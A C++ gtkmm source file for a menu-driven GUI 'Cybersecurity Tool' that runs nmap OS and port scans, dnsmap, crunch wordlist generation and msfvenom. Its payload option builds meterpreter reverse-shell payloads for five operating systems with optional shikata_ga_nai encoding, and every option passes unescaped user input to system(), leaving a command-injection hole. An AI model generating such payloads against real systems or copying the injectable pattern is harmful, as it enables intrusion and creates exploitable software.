#include <gtkmm.h>
#include <iostream>
#include <string>
#include <cstdlib>  

using namespace std;

class MainWindow : public Gtk::Window {
public:
    MainWindow() {
        set_title("Cybersecurity Tool");
        set_default_size(400, 300); 

        
        options.append("Select an Option");
        options.append("1. OS detection");
        options.append("2. Scan Port");
        options.append("3. DNS Mapping");
        options.append("4. Create Payload");
        options.append("5. Create Custom Wordlist");
        options.append("6. Exit");
        options.set_active(0);  
        options.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::on_option_changed));

        
        vbox.pack_start(options);

        // Add a button to proceed
        proceed_button.set_label("Proceed");
        proceed_button.set_size_request(200, 40); 
        proceed_button.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_button_clicked));

        
        vbox.set_margin_top(20);    
        vbox.set_margin_bottom(20); 
        vbox.pack_start(proceed_button);

        proceed_button.set_margin_left(20);
        proceed_button.set_margin_right(20);

        
        proceed_button.set_border_width(10); 

        add(vbox);  
        show_all_children();
    }

protected:
    Gtk::ComboBoxText options;
    Gtk::Button proceed_button;
    Gtk::Box vbox{Gtk::ORIENTATION_VERTICAL};  

    
    void on_option_changed() {
        cout << "Option changed to: " << options.get_active_text() << endl;
    }

    
    void on_button_clicked() {
        string selected_option = options.get_active_text();
        if (selected_option == "1. OS detection") {
            open_os_detection_page(); 
        } else if (selected_option == "2. Scan Port") {
            open_scan_port_page();
        } else if (selected_option == "3. DNS Mapping") {
            open_dns_mapping_page();
        } else if (selected_option == "4. Create Payload") {
            open_create_payload_page();
        }else if(selected_option=="5. Create Custom Wordlist"){
            open_create_custom_wordlist();
        } else if (selected_option == "6. Exit") {
            close();
        } else {
            cout << "Please select a valid option." << endl;
        }
    }

    
    void open_os_detection_page() {
        Gtk::Dialog dialog("OS Detection", *this);
        Gtk::Entry entry;
        Gtk::Label label("Enter the IP address:");

        dialog.get_content_area()->pack_start(label);
        dialog.get_content_area()->pack_start(entry);
        dialog.add_button("Detect", Gtk::RESPONSE_OK);
        dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
        dialog.show_all_children();

        if (dialog.run() == Gtk::RESPONSE_OK) {
            string ip = entry.get_text();
            if (ip.empty()) {
                cerr << "Invalid IP address." << endl;
            } else {
                
                string command = "gnome-terminal -- bash -c 'nmap -O " + ip + "; exec bash'";
                system(command.c_str());
            }
        }
    }

    
void open_scan_port_page() {
    Gtk::Dialog dialog("Port Scanning", *this);

    
    Gtk::Entry ip_entry;
    Gtk::Label ip_label("Enter the IP address to scan:");
    dialog.get_content_area()->pack_start(ip_label);
    dialog.get_content_area()->pack_start(ip_entry);

    
    Gtk::ComboBoxText scan_options;
    scan_options.append("Select a scan option");
    scan_options.append("1. Scan a specific port");
    scan_options.append("2. Scan a range of ports");
    scan_options.set_active(0);  
    dialog.get_content_area()->pack_start(scan_options);

    
    Gtk::Entry specific_port_entry, start_port_entry, end_port_entry;
    Gtk::Label label1("Enter the specific port number to scan:");
    Gtk::Label label2("Enter the start of the port range:");
    Gtk::Label label3("Enter the end of the port range:");

    
    label1.hide();
    specific_port_entry.hide();
    label2.hide();
    start_port_entry.hide();
    label3.hide();
    end_port_entry.hide();

    
    dialog.get_content_area()->pack_start(label1);
    dialog.get_content_area()->pack_start(specific_port_entry);
    dialog.get_content_area()->pack_start(label2);
    dialog.get_content_area()->pack_start(start_port_entry);
    dialog.get_content_area()->pack_start(label3);
    dialog.get_content_area()->pack_start(end_port_entry);

    
    scan_options.signal_changed().connect([&]() {
        string selected_option = scan_options.get_active_text();

        if (selected_option == "1. Scan a specific port") {
            
            label1.show();
            specific_port_entry.show();
            label2.hide();
            start_port_entry.hide();
            label3.hide();
            end_port_entry.hide();
        } else if (selected_option == "2. Scan a range of ports") {
            
            label1.hide();
            specific_port_entry.hide();
            label2.show();
            start_port_entry.show();
            label3.show();
            end_port_entry.show();
        } else {
            
            label1.hide();
            specific_port_entry.hide();
            label2.hide();
            start_port_entry.hide();
            label3.hide();
            end_port_entry.hide();
        }
    });

    dialog.add_button("Scan", Gtk::RESPONSE_OK);
    dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
    dialog.show_all_children();

    if (dialog.run() == Gtk::RESPONSE_OK) {
        string ip_address = ip_entry.get_text();
        if (ip_address.empty()) {
            cerr << "Please enter a valid IP address." << endl;
            return;
        }

        string scan_choice = scan_options.get_active_text();
        string command;

        if (scan_choice == "1. Scan a specific port") {
            string port = specific_port_entry.get_text();
            if (!port.empty() && all_of(port.begin(), port.end(), ::isdigit)) {
                command = "gnome-terminal -- bash -c 'nmap -p " + port + " " + ip_address + "; exec bash'";
            } else {
                cerr << "Invalid port number." << endl;
            }
        } else if (scan_choice == "2. Scan a range of ports") {
            string start_port = start_port_entry.get_text();
            string end_port = end_port_entry.get_text();
            if (!start_port.empty() && !end_port.empty() && all_of(start_port.begin(), start_port.end(), ::isdigit) && all_of(end_port.begin(), end_port.end(), ::isdigit)) {
                command = "gnome-terminal -- bash -c 'nmap -p " + start_port + "-" + end_port + " " + ip_address + "; exec bash'";
            } else {
                cerr << "Invalid port range." << endl;
            }
        }

        if (!command.empty()) {
            system(command.c_str());
        }
    }
}




    
    void open_dns_mapping_page() {
        Gtk::Dialog dialog("DNS Mapping", *this);
        Gtk::Entry entry;
        Gtk::Label label("Enter the URL or IP:");

        dialog.get_content_area()->pack_start(label);
        dialog.get_content_area()->pack_start(entry);
        dialog.add_button("Map", Gtk::RESPONSE_OK);
        dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
        dialog.show_all_children();

        if (dialog.run() == Gtk::RESPONSE_OK) {
            string url = entry.get_text();
            if (url.empty()) {
                cerr << "Invalid URL or IP." << endl;
            } else {
                
                string command = "gnome-terminal -- bash -c 'dnsmap " + url + "; exec bash'";
                system(command.c_str());
            }
        }
    }

    
    void open_create_payload_page() {
        Gtk::Dialog dialog("Payload Creation", *this);
        Gtk::Entry ip_entry, port_entry, payload_name_entry;
        Gtk::Label label1("Enter your IP address:");
        Gtk::Label label2("Enter the open port:");
        Gtk::Label label5("Enter custom payload name:");

        dialog.get_content_area()->pack_start(label1);
        dialog.get_content_area()->pack_start(ip_entry);
        dialog.get_content_area()->pack_start(label2);
        dialog.get_content_area()->pack_start(port_entry);
        dialog.get_content_area()->pack_start(label5);
        dialog.get_content_area()->pack_start(payload_name_entry);  

        
        Gtk::ComboBoxText os_selection;
        os_selection.append("Select OS");
        os_selection.append("1. Windows");
        os_selection.append("2. Linux");
        os_selection.append("3. Mac");
        os_selection.append("4. Android");
        os_selection.append("5. iOS");
        os_selection.set_active(0);
        Gtk::Label label3("Select the target OS:");
        dialog.get_content_area()->pack_start(label3);
        dialog.get_content_area()->pack_start(os_selection);

        Gtk::ComboBoxText encryption_selection;
        encryption_selection.append("No encryption/encoding");
        encryption_selection.append("Normal encryption/encoding");
        encryption_selection.append("Iterative encryption/encoding");
        encryption_selection.set_active(0);
        Gtk::Label label4("Select encryption/encoding type:");
        dialog.get_content_area()->pack_start(label4);
        dialog.get_content_area()->pack_start(encryption_selection);

        
        Gtk::Entry iteration_entry;
        Gtk::Label iteration_label("Enter the number of iterations (only for iterative encryption):");
        dialog.get_content_area()->pack_start(iteration_label);
        dialog.get_content_area()->pack_start(iteration_entry);

        dialog.add_button("Create Payload", Gtk::RESPONSE_OK);
        dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
        dialog.show_all_children();

        if (dialog.run() == Gtk::RESPONSE_OK) {
            string ip = ip_entry.get_text();
            string port = port_entry.get_text();
            string os = os_selection.get_active_text();
            string encryption = encryption_selection.get_active_text();
            string iterations = iteration_entry.get_text();
            string payload_name = payload_name_entry.get_text();  

            if (ip.empty() || port.empty() || !all_of(port.begin(), port.end(), ::isdigit) || os == "Select OS") {
                cerr << "Invalid IP, port, or OS selection." << endl;
            } else {
                
                if (payload_name.empty()) {
                    payload_name = "payload";
                }

                string payload_type;
                string file_extension;
                if (os == "1. Windows") {
                    payload_type = "windows/meterpreter/reverse_tcp";
                    file_extension = "exe";
                } else if (os == "2. Linux") {
                    payload_type = "linux/x86/meterpreter/reverse_tcp";
                    file_extension = "elf";
                } else if (os == "3. Mac") {
                    payload_type = "osx/x86/shell_reverse_tcp";
                    file_extension = "macho";
                } else if (os == "4. Android") {
                    payload_type = "android/meterpreter/reverse_tcp";
                    file_extension = "apk";
                } else if (os == "5. iOS") {
                    payload_type = "apple_ios/aarch64/meterpreter_reverse_tcp";
                    file_extension = "macho";
                }

                string command;
                if (encryption == "Normal encryption/encoding") {
                    command = "msfvenom -p " + payload_type + " LHOST=" + ip + " LPORT=" + port + " -e x86/shikata_ga_nai -i 1 -f " + file_extension + " > " + payload_name + "." + file_extension;
                } else if (encryption == "Iterative encryption/encoding" && !iterations.empty() && all_of(iterations.begin(), iterations.end(), ::isdigit)) {
                    command = "msfvenom -p " + payload_type + " LHOST=" + ip + " LPORT=" + port + " -e x86/shikata_ga_nai -i " + iterations + " -f " + file_extension + " > " + payload_name + "." + file_extension;
                } else {
                    command = "msfvenom -p " + payload_type + " LHOST=" + ip + " LPORT=" + port + " -f " + file_extension + " > " + payload_name + "." + file_extension;
                }

                system(command.c_str());
            }
        }
    }
    
    void open_create_custom_wordlist(){
        Gtk::Dialog dialog("Create custome Wordlist", *this);
        Gtk::Label label1("Enter the minimum length of word:");
        Gtk::Entry min_entry;
        Gtk::Label label2("Enter the maximun length of the word:");
        Gtk::Entry max_entry;
        Gtk::Label label3("Enter the character set (e.g. ,abc#21):");
        Gtk::Entry charset_entry;
        Gtk::Label label4("Enter the output file name:");
        Gtk::Entry output_file_entry;
        
        dialog.get_content_area()->pack_start(label1);
        dialog.get_content_area()->pack_start(min_entry);
        dialog.get_content_area()->pack_start(label2);
        dialog.get_content_area()->pack_start(max_entry);
        dialog.get_content_area()->pack_start(label3);
        dialog.get_content_area()->pack_start(charset_entry);
        dialog.get_content_area()->pack_start(label4);
        dialog.get_content_area()->pack_start(output_file_entry);
        
        dialog.add_button("Create", Gtk::RESPONSE_OK);
        dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
        dialog.show_all_children();
        
        if (dialog.run() == Gtk::RESPONSE_OK) {
            string min_length = min_entry.get_text();
            string max_length = max_entry.get_text();
            string charset = charset_entry.get_text();
            string output_file = output_file_entry.get_text();

            if (min_length.empty() || max_length.empty() || charset.empty() || output_file.empty()) {
                cerr << "All fields must be filled out." << endl;
                return;
            }

            if (!all_of(min_length.begin(), min_length.end(), ::isdigit) ||
                !all_of(max_length.begin(), max_length.end(), ::isdigit)) {
                cerr << "Minimum and maximum lengths must be numeric." << endl;
                return;
            }

            string command = "gnome-terminal -- bash -c 'crunch " + min_length + " " + max_length + " " + charset + " -o " + output_file + "; exec bash'";
            system(command.c_str());
        }
    }
};

int main(int argc, char *argv[]) {
    auto app = Gtk::Application::create(argc, argv, "org.gtkmm.example");

    MainWindow window;

    return app->run(window);
}
